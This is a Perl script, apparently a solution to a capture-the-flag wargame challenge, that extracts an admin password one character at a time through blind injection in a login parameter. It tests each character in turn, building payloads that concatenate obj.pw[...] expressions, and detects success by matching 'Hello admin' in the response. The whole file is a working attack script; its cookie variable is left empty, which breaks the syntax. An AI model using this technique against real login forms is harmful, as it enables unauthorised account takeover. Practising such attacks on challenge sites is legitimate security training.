#!/usr/bin/perl
use strict;
use warnings;
use LWP::UserAgent;

$ENV{PERL_LWP_SSL_CA_FILE} = '/etc/ssl/cert.pem';
$|++;

use Data::Dumper;

my @charset = (
  #33  ..  47,  # !"#$%&'()*+,-./
  48  ..  57,  # 0-9
  #58  ..  64,  # :;<=>?@
  #65  ..  70,  # A-F
  #97  ..  102, # a-f
  #65  ..  90,  # A-Z
  #91  ..  96,  # [\]^_`
  97  ..  122, # a-z
  #123 ..  126, # {|}~
);

my $url =
"https://los.rubiya.kr/chall/incubus_3dff9ce783c9f574edf015a7b99450d7.php"
;

my $cookie =
;

my $ua = LWP::UserAgent->new;
my $found = '';

for my $index (0..7) {

  for my $ord (@charset) {
    my $char = chr $ord;
    print $char;

    # prepare payload
    my $payload = "?id=admin&pw=${found}${char}'%2b";
    $payload .= "obj.pw[$_]%2b" for $index+1 .. 7;
    $payload .= "%27";

RETRY:
    print "\n$index => $payload\n";

    my $resp = $ua->get( $url.$payload, 'Cookie' => $cookie );

    if ( $resp->is_error ) {
      printf "\n[%d] %s\n", $resp->code, $resp->message;
      redo RETRY;
    }

    if ($resp->content =~ '<h2>Hello admin</h2>') {
      $found .= $char;
      print "\n$index => $char, Total: '$found / $char'\n";
      last;
    }
    else {
      $found .= chr 219 if $index == $#charset; # last char and not found
    }
  }
}
# vim:sw=2:ts=2:sts=2:et:cc=80
# End of file
